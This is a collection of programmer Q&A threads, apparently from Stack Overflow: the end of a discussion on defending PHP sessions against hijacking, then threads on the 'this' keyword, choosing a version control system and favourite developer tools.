$aip = $_SERVER['REMOTE_ADDR'];
$bip = $_SERVER['HTTP_X_FORWARDED_FOR'];
$agent = $_SERVER['HTTP_USER_AGENT'];
session_start();

// Do this each time the user successfully logs in.
$_SESSION['ident'] = hash(""sha256"", $aip . $bip . $agent);

// Do this every time the client makes a request to the server, after authenticating
$ident = hash(""sha256"", $aip . $bip . $agent);
if ($ident != $_SESSION['ident'])
{
    end_session();
    header(""Location: login.php"");
    // add some fancy pants GET/POST var headers for login.php, that lets you
    // know in the login page to notify the user of why they're being challenged
    // for login again, etc.
}
</code></pre>

<p>What this does is capture 'contextual' information about the user's session, pieces of information which should not change during the life of a single session. A user isn't going to be at a computer in the US and in China at the same time, right? So if the IP address changes suddenly within the same session that strongly implies a session hijacking attempt, so you secure the session by ending the session and forcing the user to re-authenticate. This thwarts the hack attempt, the attacker is also forced to login instead of gaining access to the session. Notify the user of the attempt (ajax it up a bit), and vola, Slightly annoyed+informed user and their session/information is protected.</p>

<p>We throw in User Agent and X-FORWARDED-FOR to do our best to capture uniqueness of a session for systems behind proxies/networks. You may be able to use more information then that, feel free to be creative.</p>

<p>It's not 100%, but it's pretty damn effective.</p>

<p>There's more you can do to protect sessions, expire them, when a user leaves a website and comes back force them to login again maybe. You can detect a user leaving and coming back by capturing a blank HTTP_REFERER (domain was typed in the URL bar), or check if the value in the HTTP_REFERER equals your domain or not (the user clicked an external/crafted link to get to your site).</p>

<p>Expire sessions, don't let them remain valid indefinitely.</p>

<p>Don't rely on cookies, they can be stolen, it's one of the vectors of attack for session hijacking.</p>
 <p>Let us consider that during the login phase the client and server can agree on a secret salt value. Thereafter the server provides a count value with each update and expects the client to respond with the hash of the (secret salt + count). The potential hijacker does not have any way to obtain this secret salt value and thus cannot generate the next hash.</p>
 <p>There are many ways to create protection against session hijack, however all of them are either reducing user satisfaction or are not secure.</p>

<ul>
<li><p>IP and/or X-FORWARDED-FOR checks. These work, and are pretty secure... but imagine the pain of users. They come to an office with WiFi, they get new IP address and lose the session. Got to log-in again.</p></li>
<li><p>User Agent checks. Same as above, new version of browser is out, and you lose a session. Additionally, these are really easy to ""hack"". It's trivial for hackers to send fake UA strings.</p></li>
<li><p>localStorage token. On log-on generate a token, store it in browser storage and store it to encrypted cookie (encrypted on server-side). This has no side-effects for user (localStorage persists through browser upgrades). It's not as secure - as it's just security through obscurity. Additionally you could add some logic (encryption/decryption) to JS to further obscure it.</p></li>
<li><p>Cookie reissuing. This is probably the right way to do it. The trick is to only allow one client to use a cookie at a time. So, active user will have cookie re-issued every hour or less. Old cookie is invalidated if new one is issued. Hacks are still possible, but much harder to do - either hacker or valid user will get access rejected. </p></li>
</ul>
"
"When do you use the ""this"" keyword? <p>I was curious about how other people use the <strong>this</strong> keyword. I tend to use it in constructors, but I may also use it throughout the class in other methods. Some examples:</p>

<p>In a constructor:</p>

<pre><code>public Light(Vector v)
{
    this.dir = new Vector(v);
}
</code></pre>

<p>Elsewhere</p>

<pre><code>public void SomeMethod()
{
    Vector vec = new Vector();
    double d = (vec * vec) - (this.radius * this.radius);
}
</code></pre>
 <p>I use it every time I refer to an instance variable, even if I don't need to. I think it makes the code more clear.</p>
 <p>I use it anywhere there might be ambiguity (obviously). Not just compiler ambiguity (it would be required in that case), but also ambiguity for someone looking at the code.</p>
 <p>I tend to underscore fields with _ so don't really ever need to use this. Also R# tends to refactor them away anyway...</p>
 <p>You should always use it, I use it to diferantiate private fields and parameters (because our naming conventions state that we don't use prefixes for member and parameter names (and they are based on information found on the internet, so I consider that a best practice))</p>
 <p>I only use it when absolutely necessary, ie, when another variable is shadowing another.  Such as here:</p>

<pre><code>class Vector3
{
    float x;
    float y;
    float z;

    public Vector3(float x, float y, float z)
    {
        this.x = x;
        this.y = y;
        this.z = z;
    }

}
</code></pre>

<p>Or as Ryan Fox points out, when you need to pass this as a parameter.</p>
 <p>Any time you need a reference to the current object.</p>

<p>One particularly handy scenario is when your object is calling a function and wants to pass itself into it.</p>

<p>Example:</p>

<pre><code>void onChange()
{
    screen.draw(this);
}
</code></pre>
 <p>I pretty much only use <strong>this</strong> when referencing a type property from inside the same type.  As another user mentioned, I also underscore local fields so they are noticeable without needing <strong>this</strong>.</p>
 <p>It depends on the coding standard I'm working under.  If we are using _ to denote an instance variable then ""this"" becomes redundant. If we are not using _ then I tend to use this to denote instance variable.</p>
 <p>I tend to use it everywhere as well, just to make sure that it is clear that it is instance members that we are dealing with.</p>
 <p>I can't believe all of the people that say using it always is a ""best practice"" and such.</p>

<p>Use ""this"" when there is ambiguity, as in <a href=""http://stackoverflow.com/a/23264/282110"">Corey's example</a> or when you need to pass the object as a parameter, as in <a href=""http://stackoverflow.com/a/23267/282110"">Ryan's example</a>. There is no reason to use it otherwise because being able to resolve a variable based on the scope chain should be clear enough that qualifying variables with it should be unnecessary.</p>

<p>EDIT: The C# documentation on ""this"" indicates one more use, besides the two I mentioned, for the ""this"" keyword - <a href=""http://msdn.microsoft.com/en-us/library/dk1507sz%28VS.71%29.aspx"">for declaring indexers</a></p>

<p>EDIT: @Juan: Huh, I don't see any inconsistency in my statements - there are 3 instances when I would use the ""this"" keyword (as documented in the C# documentation), and those are times when you actually <em>need</em> it. Sticking ""this"" in front of variables in a constructor when there is no shadowing going on is simply a waste of keystrokes and a waste of my time when reading it, it provides no benefit.</p>
 <p>Never. Ever. If you have variable shadowing, your naming conventions are on crack. I mean, really, no distinguishing naming for member variables? <em>Facepalm</em></p>
 <p>I use it whenever <a href=""http://code.msdn.microsoft.com/sourceanalysis"">StyleCop</a> tells me to. <a href=""http://code.msdn.microsoft.com/sourceanalysis"">StyleCop</a> must be obeyed. Oh yes.</p>
 <p>I don't mean this to sound snarky, but it doesn't matter.</p>

<p>Seriously.</p>

<p>Look at the things that are important: your project, your code, your job, your personal life. None of them are going to have their success rest on whether or not you use the ""this"" keyword to qualify access to fields. The this keyword will not help you ship on time. It's not going to reduce bugs, it's not going to have any appreciable effect on code quality or maintainability. It's not going to get you a raise, or allow you to spend less time at the office. </p>

<p>It's really just a style issue. If you like ""this"", then use it. If you don't, then don't. If you need it to get correct semantics then use it. The truth is, every programmer has his own unique programing style. That style reflects that particular programmer's notions of what the ""most aesthetically pleasing code"" should look like. By definition, any other programmer who reads your code is going to have a different programing style. That means there is always going to be something you did that the other guy doesn't like, or would have done differently. At some point some guy is going to read your code and grumble about something. </p>

<p>I wouldn't fret over it. I would just make sure the code is as aesthetically pleasing as possible according to your own tastes. If you ask 10 programmers how to format code, you are going to get about 15 different opinions. A better thing to focus on is how the code is factored. Are things abstracted right? Did I pick meaningful names for things? Is there a lot of code duplication? Are there ways I can simplify stuff? Getting those things right, I think, will have the greatest positive impact on your project, your code, your job, and your life. Coincidentally, it will probably also cause the other guy to grumble the least. If your code works, is easy to read, and is well factored, the other guy isn't going to be scrutinizing how you initialize fields. He's just going to use your code, marvel at it's greatness, and then move on to something else.</p>
 <p>There are several usages of <a href=""http://msdn.microsoft.com/en-us/library/dk1507sz.aspx"">this</a> keyword in C#.</p>

<ol>
<li><a href=""http://msdn.microsoft.com/en-us/library/vstudio/dk1507sz%28v=vs.100%29.aspx"">To qualify members hidden by similar name</a></li>
<li><a href=""http://msdn.microsoft.com/en-us/library/vstudio/dk1507sz%28v=vs.100%29.aspx"">To have an object pass itself as a parameter to other methods</a></li>
<li>To have an object return itself from a method</li>
<li><a href=""http://msdn.microsoft.com/en-us/library/6x16t2tx.aspx"">To declare indexers</a></li>
<li><a href=""http://msdn.microsoft.com/en-us/library/bb383977.aspx"">To declare extension methods</a></li>
<li><a href=""http://www.codeproject.com/Articles/7011/An-Intro-to-Constructors-in-C%29"">To pass parameters between constructors</a></li>
<li><a href=""http://stackoverflow.com/questions/194484/whats-the-strangest-corner-case-youve-seen-in-c-or-net/1800162#1800162"">To internally reassign value type (struct) value</a>.</li>
<li>To invoke an extension method on the current instance</li>
<li>To cast itself to another type</li>
<li><a href=""http://stackoverflow.com/questions/1814953/c-sharp-constructor-chaining-how-to-do-it"">To chain constructors defined in the same class</a></li>
</ol>

<p>You can avoid the first usage by not having member and local variables with the same name in scope, for example by following common naming conventions and using properties (Pascal case) instead of fields (camel case) to avoid colliding with local variables (also camel case). In C# 3.0 fields can be converted to properties easily by using <a href=""https://msdn.microsoft.com/en-us/library/bb384054.aspx"">auto-implemented properties</a>.</p>
 <p>Here's when I use it:</p>

<ul>
<li>Accessing Private Methods from within the class (to differentiate)</li>
<li>Passing the current object to another method (or as a sender object, in case of an event)</li>
<li>When creating extension methods :D</li>
</ul>

<p>I don't use this for Private fields because I prefix private field variable names with an underscore (_). </p>
 <p>Personally, I try to always use <em>this</em> when referring to member variables.  It helps clarify the code and make it more readable.  Even if there is no ambiguity, someone reading through my code for the first time doesn't know that, but if they see <em>this</em> used consistently, they will know if they are looking at a member variable or not.</p>
 <p>I got in the habit of using it liberally in Visual C++ since doing so would trigger IntelliSense ones I hit the '>' key, and I'm lazy. (and prone to typos)</p>

<p>But I've continued to use it, since I find it handy to see that I'm calling a member function rather than a global function.</p>
 <p>[C++]</p>

<p>I agree with the ""use it when you have to"" brigade. Decorating code unnecessarily with <em>this</em> isn't a great idea because the compiler won't warn you when you forget to do it. This introduces potential confusion for people expecting <em>this</em> to always be there, i.e. they'll have to <em>think</em> about it.</p>

<p>So, when would you use it? I've just had a look around some random code and found these examples (I'm not passing judgement on whether these are <em>good</em> things to do or otherwise):</p>

<ul>
<li>Passing ""yourself"" to a function.</li>
<li>Assigning ""yourself"" to a pointer or something like that.</li>
<li>Casting, i.e. up/down casting (safe or otherwise), casting away constness, etc.</li>
<li>Compiler enforced disambiguation.</li>
</ul>
 <p>You should not use ""this"" unless you absolutely must.</p>

<p>There IS a penalty associated with unnecessary verbosity. You should strive for code that is exactly as long as it needs to be, and no longer.</p>
 <p>@<a href=""#39993"" rel=""nofollow"">dicroce </a>: ""There IS a penalty associated with unnecessary verbosity"" - what kind of a penalty? Certainly not a performance penalty.. Maybe the source file will take a larger amount of space on the hard drive? Or whaaat?</p>
 <p>I use it only when required, except for symmetric operations which due to single argument polymorphism have to be put into methods of one side:</p>

<pre><code>boolean sameValue (SomeNum other) {
   return this.importantValue == other.importantValue;
}
</code></pre>
 <p><strong>[C++]</strong></p>

<p><em>this</em> is used in the assignment operator where most of the time you have to check and prevent strange (unintentional, dangerous, or just a waste of time for the program) things like:</p>

<pre><code>A a;
a = a;
</code></pre>

<p>Your assignment operator will be written:</p>

<pre><code>A&amp; A::operator=(const A&amp; a) {
    if (this == &amp;a) return *this;

    // we know both sides of the = operator are different, do something...

    return *this;
}
</code></pre>
 <h2><code>this</code> on a C++ compiler</h2>

<p>The C++ compiler will silently lookup for a symbol if it does not find it immediately. Sometimes, most of the time, it is good:</p>

<ul>
<li>using the mother class' method if you did not overloaded it in the child class.</li>
<li>promoting a value of a type into another type</li>
</ul>

<p>But sometimes, <strong>You just don't want the compiler to guess. You want the compiler to pick-up the right symbol and not another.</strong></p>

<p><strong>For me</strong>, those times are when, within a method, I want to access to a member method or member variable. I just don't want some random symbol picked up just because I wrote <code>printf</code> instead of <code>print</code>. <code>this->printf</code> would not have compiled.</p>

<p>The point is that, with C legacy libraries (§), legacy code written years ago (§§), or whatever could happen in a language where copy/pasting is an obsolete but still active feature, sometimes, telling the compiler to not play wits is a great idea.</p>

<p>These are the reasons I use <code>this</code>.</p>

<p>(§) it's still a kind of mystery to me, but I now wonder if the fact you include the &lt;windows.h&gt; header in your source, is the reason all the legacy C libraries symbols will pollute your global namespace</p>

<p>(§§) realizing that ""you need to include a header, but that including this header will break  your code because it uses some dumb macro with a generic name"" is one of those <a href=""http://en.wikipedia.org/wiki/Russian_roulette"" rel=""nofollow"">russian roulette</a> moments of a coder's life</p>
 <p>Another somewhat rare use for the this keyword is when you need to invoke an explicit interface implementation from within the implementing class. Here's a contrived example:</p>

<pre><code>class Example : ICloneable
{
    private void CallClone()
    {
        object clone = ((ICloneable)this).Clone();
    }

    object ICloneable.Clone()
    {
        throw new NotImplementedException();
    }
}
</code></pre>
 <p>In Jakub Šturc's answer his #5 about passing data between contructors probably could use a little explanation. This is in overloading constructors and is the one case where use of <code>this</code> is mandatory. In the following example we can call the parameterized constructor from the parameterless constructor with a default parameter.</p>

<pre><code>class MyClass {
    private int _x
    public MyClass() : this(5) {}
    public MyClass(int v) { _x = v;}
}
</code></pre>

<p>I've found this to be a particularly useful feature on occasion.</p>
 <p>I use it to invoke <strong>Intellisense</strong> just like <a href=""http://stackoverflow.com/questions/23250/when-do-you-use-the-this-keyword#27246"">JohnMcG</a>, but I'll go back and erase ""this->"" when I'm done.  I follow the Microsoft convention of prefixing member variables with ""m_"", so leaving it as documentation would just be redundant.</p>
 <p>1 - Common Java setter idiom:</p>

<pre><code> public void setFoo(int foo) {
     this.foo = foo;
 }
</code></pre>

<p>2 - When calling a function with this object as a parameter</p>

<pre><code>notifier.addListener(this);
</code></pre>
 <p>'this.' helps find members on 'this' class with a lot of members (usually due to a deep inheritance chain).</p>

<p>Hitting CTRL+Space doesn't help with this, because it also includes types; where-as 'this.' includes members ONLY.</p>

<p>I usually delete it once I have what I was after: but this is just my style breaking through.</p>

<p>In terms of style, if you are a lone-ranger -- you decide; if you work for a company stick to the company policy (look at the stuff in source control and see what other people are doing). In terms of using it to qualify members, neither is right or wrong. The only wrong thing is inconsistency -- that is the golden rule of style. Leave the nit-picking others. Spend your time pondering real coding problems -- and obviously coding -- instead.</p>
 <p>I use it every time I can.  I believe it makes the code more readable, and more readable code equals less bugs and more maintainability.</p>
 <p>When you are many developers working on the same code base, you need some code guidelines/rules. Where I work we've desided to use 'this' on fields, properties and events.</p>

<p>To me it makes good sense to do it like this, it makes the code easier to read when you differentiate between class-variables and method-variables.</p>
 <p>There is one use that has not already been mentioned in C++, and that is not to refer to the own object or disambiguate a member from a received variable.</p>

<p>You can use <code>this</code> to convert a non-dependent name into an argument dependent name inside template classes that inherit from other templates.</p>

<pre><code>template &lt;typename T&gt;
struct base {
   void f() {}
};

template &lt;typename T&gt;
struct derived : public base&lt;T&gt;
{
   void test() {
      //f(); // [1] error
      base&lt;T&gt;::f(); // quite verbose if there is more than one argument, but valid
      this-&gt;f(); // f is now an argument dependent symbol
   }
}
</code></pre>

<p>Templates are compiled with a two pass mechanism. During the first pass, only non-argument dependent names are resolved and checked, while dependent names are checked only for coherence, without actually substituting the template arguments. </p>

<p>At that step, without actually substituting the type, the compiler has almost no information of what <code>base&lt;T&gt;</code> could be (note that specialization  of the base template can turn it into completely different types, even undefined types), so it just assumes that it is a type. At this stage the non-dependent call <code>f</code> that seems just natural to the programmer is a symbol that the compiler must find as a member of <code>derived</code> or in enclosing namespaces --which does not happen in the example-- and it will complain.</p>

<p>The solution is turning the non-dependent name <code>f</code> into a dependent name. This can be done in a couple of ways, by explicitly stating the type where it is implemented (<code>base&lt;T&gt;::f</code> --adding the <code>base&lt;T&gt;</code> makes the symbol dependent on <code>T</code> and the compiler will just assume that it will exist and postpones the actual check for the second pass, after argument substitution.</p>

<p>The second way, much sorter if you inherit from templates that have more than one argument, or long names, is just adding a <code>this-&gt;</code> before the symbol. As the template class you are implementing does depend on an argument (it inherits from <code>base&lt;T&gt;</code>) <code>this-&gt;</code> is argument dependent, and we get the same result: <code>this-&gt;f</code> is checked in the second round, after template parameter substitution.</p>
 <p>I use it when, in a function that accepts a reference to an object of the same type, I want to make it <strong>perfectly clear</strong> which object I'm referring to, where.</p>

<p>For example</p>

<pre><code>class AABB
{
  // ... members
  bool intersects( AABB other )
  {
    return other.left() &lt; this-&gt;right() &amp;&amp;
           this-&gt;left() &lt; other.right() &amp;&amp;

           // +y increases going down
           other.top() &lt; this-&gt;bottom() &amp;&amp;
           this-&gt;top() &lt; other.bottom() ;
  }
} ;
</code></pre>

<p>(vs)</p>

<pre><code>class AABB
{
  bool intersects( AABB other )
  {
    return other.left() &lt; right() &amp;&amp;
           left() &lt; other.right() &amp;&amp;

           // +y increases going down
           other.top() &lt; bottom() &amp;&amp;
           top() &lt; other.bottom() ;
  }
} ;
</code></pre>

<p>At a glance which AABB does <code>right()</code> refer to?  The <code>this</code> adds a bit of a clarifier.</p>
 <p>I consider that keyword stuffing. I don't know if you'll get penalized for it but it's not worth the risk. Google has penalized before for keyword stuffing, so I guess it's just a matter of time before you get penalized. If it doesn't help the user, there's no point in having it on the site. Put it in sentences and make it useful for readers or don't have it at all. </p>
"
"Source Control Beginners <p>What would be the best version control system to learn as a beginner to source control?</p>
 <p>Anything, but I would learn a modern system like git or subversion myself. My first VCS was RCS, but I got the basics down.</p>
 <p>Well, if you are just wanting to learn on your own, I would say you should go with something free, like subversion.  If you are a company who has never used source control before, then it really depends on your needs.</p>
 <p>I'd suggest you try Subversion, for example with the <a href=""http://svn1clicksetup.tigris.org/"" rel=""nofollow"">1-click SVN installer</a>. Try searching SO for ""Subversion"", and you'll find loads of questions with answers that point to good tutorials.</p>

<p>Good luck!</p>
 <p>My first exposure was CVS with WinCVS as a client.  it was horrid.  Next was Subversion, with TortoiseSVN and Eclipse's integration.  It was intuitive, and heavenly.  I think that using CVS with TortoiseCVS and Eclipse's would be nice as well, though I prefer the way SVN handles revisioning. The entire repository is versioned with each check in, not individual files.</p>
 <p>There are a few core concepts that I think are important to learn:</p>

<ol>
<li>Check-ins/check-outs (obviously)</li>
<li>Local versions vs. server versions</li>
<li>Mapping/Binding a local workspace to a remote store or repository.</li>
<li>Merging your changes back into a file that contains changes from
others.</li>
<li>Branching (what it is, when/why to use it)</li>
<li>Merging changes from a branch back into a main branch or trunk.</li>
</ol>

<p>Most modern source control systems require some knowledge of the above topics and should help facilitate you learning them. Then you have distributed source control, which I don't have any experience with but is supposed to be fairly complicated and may not be suitable for a beginner.</p>

<p><a href=""http://subversion.tigris.org/"" rel=""nofollow"">Subversion</a> is great because it has all of the modern features you'd want and is free.</p>

<p><a href=""http://git-scm.com/"" rel=""nofollow"">Git</a> is also becoming an increasingly popular option and is another free or very low cost alternative to Subversion. Knowledge regarding the concepts of branching and merging become critical for using Git, however.</p>

<p>You can use <a href=""http://unfuddle.com"" rel=""nofollow"">unfuddle</a> as a free and easy way to experiment with both Git and Subversion. I use it to host a couple of subversion repositories for some side projects I've worked on in the past.</p>
 <p>Anything but Visual Source Safe; preferably one which supports the concepts of branching and merging. As others have said, Subversion is a great choice, especially with the TortoiseSVN client.</p>

<p>Be sure to check out (pardon the pun) <a href=""http://www.ericsink.com/scm/source_control.html"">Eric Sink's classic series of Source Control HOWTO articles</a>.</p>
 <p>I'd also recommend Subversion. It does not take too long to set up, it is free, and there is a really good book available online that goes over the basics as well as some advanced topics: <a href=""http://svnbook.red-bean.com/"" rel=""nofollow"">http://svnbook.red-bean.com/</a></p>
 <p>Subversion with tortoisesvn. (tortoisesvn because you can see a lot of what goes on visually and will provide a good jumping off point for the command line stuff. ) There is tons of documentation out there and most likely you will see it at least one point in your career. Almost every company I have worked for and interviewed with runs SVN. </p>
 <p>I found <a href=""http://unfuddle.com"" rel=""nofollow"">http://unfuddle.com</a> saved me messing about with installing SVN or git. You can get a free account in there and use either of those - plus you can use your OpenID there.</p>

<p>Then you avoid having to mess about setting it up right and focus on how you're going to use it!</p>
 <p><a href=""http://stackoverflow.com/questions/23310/source-control-beginners#23353"" rel=""nofollow"">@Ian Nelson</a>:</p>

<p>I agree with you that Source Safe is bad as a source control system, but keep in mind that using Source Safe is a lot better than ""carrying around floppy disks"" as Joel Spolsky said.</p>

<p>For a beginner it might not be a bad idea, since the cost of having no source control at all is a lot higher.</p>
 <p>Vault from SourceGear.com is superb. It is free for single users and provides a superb VS 2005/2008 interface. I love it!</p>

<p>rp </p>
 <p>If you're looking to learn a commercial product while getting started Perforce provides a free client and server, with the server supporting two users and five client workspaces.</p>

<p>At my previous place of employment it was used religiously not only for code by our programmers, but for art assets and game levels, and my own documentation.</p>
 <p>I'm not and advanced source control user, but I'm learning.  Here is my experience with source control products:</p>

<ol>
<li><p>A long time ago, the company I was working for at the time decided to use source control.  They introduced the concept to developers and got eveyone willing to give it a try.  They chose to use PVCS, and implemented it.  Before too long, developers would have to coordinate to lock/unlock modules and objects and we really didn't see much benefit.</p></li>
<li><p>A few years later, I was playing around with making an open source project and at the time rubyforge was offering CVS repositories.  I tried it out and it was marginally better than PVCS.  Granted I was the only one using the repository.  I did however become frustrated when I tried to rearrange the structure of my files because I didn't like the way I had initially imported them.  It didn't really work out in CVS.</p></li>
<li><p>A few years after that I was working on another personal project and my web hosting provider offered easy to setup Subversion (SVN) repositories.  It took me a little bit of research to get it up and running correctly, but once I got past the initial learning curve, I liked it.</p></li>
<li><p>Not long after that I realized that I liked having source control and that my current job didn't have it.  So I evangelized, and after a long period of time, my team implemented Source Safe because we work in Visual Studio and are generally a Microsoft shop.  I was eager to use it, but before long I found that I was losing files and that Visual Studio was putting things in the wrong place and that I'd work on a project for a while and then go to export my work to another location and find that it either wouldn't export or would only export some of the projects in a solution.  This made me realize that even though I thought I was using a ""version control system"", the copy of the code that was most secure, robust  and complete was my working copy.  The exact opposite of what source control is supposed to do.</p></li>
<li><p>So last week I was so fed up with Source Safe that I went searching.  After looking into a few solutions, I decided to try git. I won't say it's all been roses, since I have again had some learning curve to get it to do what I want it to do,  However, I have liked it enough to convert all of my work and personal projects over to it.  One of the really nice things about it is that I don't need a centralized repository so I can use it without going through a ton of red tape at work to get it installed.  </p></li>
</ol>

<p>So in short I would reccommend git, I use Mysysgit in windows and it has the added bonus of giving me a bash shell.  On Linux you can just install it from your package manager.  If you don't like git, try subversion.  If you don't like either of those you probably won't like CVS or PVCS either.  Under no circumstances try Source Safe, it's awful.</p>
 <p>I'd go straight for <a href=""http://git-scm.com/"">Git</a>. I've used subversion before, but always felt like I was doing it wrong. Git made sense from day one.</p>

<p>Useful resources:</p>

<ul>
<li><a href=""http://www.youtube.com/watch?v=4XpnKHJAok8&amp;feature=player%5Fembedded"">Linus Torvals on Git</a></li>
<li><a href=""http://www.gitcasts.com/posts/railsconf-git-talk"">Scott Chacon ""Getting Git""</a></li>
</ul>
 <p>Each tool has it's strengths and weaknesses. It's very much a question of what your requirements are. Unfortunately with this issue, like many others, it's often not the best tool that is selected but the one that someone is familiar with. For instance, if you don't require many branches and your team is small and local, almost any vcs will do the job (except SourceSafe). Things change if you need branches (which almost by necessity means you also need to do merges), your team is distributed, you need advanced security (subcontractors are not allowed to entire source tree), task tracking, etc. There is also the question of cost in three different ways: cost of licenses, cost of maintenance (some tools are so complicated that you in practice need someone just to control the repositories) and cost of training. </p>

<p>Therefore suggesting one tool over another is like suggesting what would be the best programming language. </p>

<p>Just some pointers:</p>

<ul>
<li>StarTeam is the easiest of the tools
I have used. It required very little
training. I got a one-day training
since I was to be the maintainer.
This maintaining took me less than 30
minutes per week. Users I ""trained""
by writing a two-page manual and
after that I had very few questions
to answer.  </li>
<li>Continuus was the other end of the
scale as far as ease of use is
concerned. On the other hand task handling was great and it offered good support for release management. Trouble is, even as a release manager I never thought ease of making releases (it was once you learned how, but that took a considerable amount of time) should be more important than the daily work that developers do.</li>
<li>Merging and branch creating differs
wildly between tools. Some tools make
this simple, like git and ClearCase
(although the latter is very slow)
some basically force you to do the
merge by hand. If you need to do
merges a lot, the cost can get high.
ClearCase was also expensive in all
three categories mentioned before
(although it has to be said we used
all the advanced stuff which isn't
necessary). Git on the other hand
lacks a good UI and some of concepts
differ from what you might be used
to. Git's security features are also
lacking (gitosis addresses some
issues but not all).</li>
<li>Most tools I have used are also quite
slow. Tools like PVCS/Dimensions was
just slow, no matter what (basic
things like opening a directory in
the repository), some very slow in
more specific ways (like ClearCase).</li>
</ul>

<p>From the tools I have used I would select StarTeam if your developers are not very experienced (and if you don't mind paying the license, which is quite expensive) and git if you have some experienced vcs guys onboard who can set up the environment to other guys. Mercurial also looks like an interesting competitor and seems to have slightly better UI's. </p>

<p>Continuus, PVCS/Dimensions and ClearCase are just too slow, too complex and too expensive for almost any project. If someone insist on selecting one of these, I would go for ClearCase.</p>

<p>I haven't used Subversion which many seem to like (yet, I have a feeling this is about to change in the near future) so can't comment how it compares to the other tools I have used (usually as a build and/or release manager).</p>

<p>As for the first tool to choose, problem with Git, Bazaar and Mercurial is they are distributed vcs's. This is different from the traditional server-client model where you have a central repository. For just learning the stuff I would recommend also reading about the concepts. Branching for instance is something that you might not understand correctly just by trying yourself (there are different branch strategies for different situations). Plus it is very different if you are the only one accessing the repository, merge conflicts for instance wouldn't be a problem (you might get to see them but you would easily also fix them since you know the code in both branches). Of course you would learn about check outs, check ins, and such but I don't think these issues are particularily difficult in the first place.</p>

<p>Added problem with vcs's is that they tend to use different terms. In StarTeam which is otherwise easy to use they for some reason insist on using the terms ""check out"" and ""check out and lock"". The latter is what most people think the first does. There is a reason for this (you can edit files even if you don't have an exclusive lock), but it would still make much more sense to call these ""Get"" and ""Check out"" to avoid confusion.</p>
 <p>Subversion is good place to start with. It is very stable and modern version control system. 
Best online resource to start learning about Subversion would be <a href=""http://svnbook.red-bean.com/"" rel=""nofollow"">Version Control with Subversion</a>. There are lot of choices as far as server and client softwares are concerned. I personally prefer (for Windows environment).</p>

<ol>
<li><p>VisualSVN server</p></li>
<li><p>TortoiseSVN shell-integrated client and</p></li>
<li><p>AnkhSVN Visual Studio Subversion Add-On</p></li>
</ol>

<p>Again, with Subversion there are lot of options available. Also, it is a continually evolving version control system (unlike outdated SourceSafe). It could be easily integrated with numerous automated build tools (CruiseControl, FinalBuilder) and bug/issue tracking systems (JIRA). </p>

<p>If you are looking for state-of-the-art version control systems, go for Git(developed by Linus Torvalds). But if you are totally new to version control systems, I would suggest start with subversion.</p>
"
"What is your best list of 'must have' development tools? <p>I recently burned up my development laptop (it literally emitted smoke from the vents). After pulling the hd I was unable to get it to spin with a USB device attached to a home tower. Since I was on a deadline I had to rush and buy a new laptop (Turion 64 x2) running Vista.</p>

<p>After I installed my required applications VS2005/2008, Sql Server editions client tools, Adobe CS3, and source control clients: <strong>I am wondering what list of “must haves” developer tools that are out there these days?</strong> I’m a big fan of Fiddler and LinqPad, but I am wondering what I am missing?</p>

<p>[edit]I read the other question here and I am aware of Hanselman's list. I was not specific enough in my original question. By ""these days"" I meant new and latest tools (perhaps available only 64 bit), which in geek years might just be 12 days, I dunno. :)[/edit]</p>
 <p>A nightly build of <a href=""http://www.jetbrains.com/resharper/"" rel=""nofollow"">Resharper</a></p>
 <p>Notepad++ for sure</p>
 <p>I like <a href=""http://www.wholetomato.com/"" rel=""nofollow"">Whole Tomato's Visual Assist X</a> plug-in for Visual Studio. I think you get the ""most"" out of it when programming in C++ (and especially older versions of visual studio), but there are some additional syntax highlighting and refactoring tools, plus a decent search based on context / scope.</p>
 <p>I cannot live without Eclipse and Mylyn</p>
 <p>Komodo Edit, Cygwin (ssh, cat, less, sed, grep, etc.), Python, TortoiseSVN, TortoiseCVS</p>
 <p><a href=""http://getfirebug.com/"" rel=""nofollow"">Firebug</a>.</p>
 <p>Scott Hanselman has a great, updated every year or two list of tools: <a href=""http://www.hanselman.com/blog/ScottHanselmans2011UltimateDeveloperAndPowerUsersToolListForWindows.aspx"" rel=""nofollow"">Scott Hanselman's Ultimate Developer and Power Users Tool List for Windows</a></p>
 <p>A good editor and your compiler of choice.</p>

<p>Sure, some tools make your job a little easier.  Developing .Net applications without using Visual Studio would be more convoluted, but I would bet that at the end of the task, using only a text editor and the csc compiler, you would have a guru like comprehension of the language in no time at all.  You would learn things that other people may never get into.</p>

<p>Of course, a good debugger helps (Also built into VS).  I use Komodo for Perl development purely for the debugging tools involved.  Even though I still prefer to edit the code using e-TextEditor.</p>
 <p>Subversion + TortoiseSVN</p>
 <p>In no particular order (I'm a .NET web developer if you can't tell from the list):</p>

<ul>
<li><a href=""http://www.jetbrains.com/resharper/"" rel=""nofollow"">Resharper</a> - Keeps my code slim and clean!</li>
<li><a href=""http://www.red-gate.com/products/reflector/"" rel=""nofollow"">Reflector</a> - Every now and then you need to figure out how the heck something is working in the .NET library.</li>
<li><a href=""https://addons.mozilla.org/en-US/firefox/addon/1843"" rel=""nofollow"">Firebug</a> - Every web developer has this installed because it makes markup and css debugging <em>so</em> much easier.</li>
<li><a href=""http://tortoisesvn.tigris.org/"" rel=""nofollow"">Tortoise SVN</a> - By far the best version control system I have ever used.  Absolutely no complaints about it.</li>
<li><a href=""http://www.nunit.org/index.php"" rel=""nofollow"">NUnit</a> - Unit testing that doesn't get in your way.  Plus it integrates nicely with Resharper!</li>
<li>Notepad - For whatever reason, I can't shake the nostalgic feeling I get using this.  Still my go-to application for several things (to-do lists, quick side notes, quick and dirty clipboard, etc.).</li>
</ul>
 <p>TextPad rocks! And CSSViewer (FF plug-in) is nice. Heard Firebug is even better, since it allows you to edit, too, but haven't tried it.</p>

<p>Also, virtual machines. I'm using using MS Virtual PC (w/ VM additions) right now for multiple projects and it suits my purposes well. I'm sure there are better vm solutions, too, I just haven't had to look into them.</p>

<p>CrossLoop and Skype for collaboration/pair programming (particularly for remote employees).</p>

<p>AgentRansak for text/file/foler searching. I haven't used this to it's full extent, since I'm new to it, so I don't know how robust it can be. It works well for what I use it for, though. I am much more familiar with TextPad's search/replace functionality (which rocks!).</p>
 <ol>
<li>Another vote for notepad++</li>
<li>Firebug or the dev toolbar in IE</li>
<li>Lifehackers Texter (for text expansion)</li>
<li>I couldn't live my life on a computer without humanized's <a href=""http://www.humanized.com/enso/"" rel=""nofollow"">Enso</a> product</li>
</ol>
 <p>Notepadd++, Mercurial, FireFox, FireBug</p>
 <ul>
<li>Winamp (I love coding with music playing in the background)</li>
<li>Coffee</li>
</ul>
 <p>Notepad2, e.TextEditor, Textmate</p>

<p>WinSplit Revolution</p>

<p>Google, Pandora</p>

